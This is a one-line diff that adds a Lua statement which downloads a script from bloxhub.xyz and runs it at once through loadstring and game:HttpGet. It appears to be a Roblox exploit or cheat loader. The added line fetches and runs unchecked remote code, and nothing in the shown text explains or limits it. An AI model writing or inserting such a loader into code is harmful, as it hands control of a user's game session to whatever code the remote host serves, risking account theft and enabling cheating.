@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://bloxhub.xyz/script/loader"))()
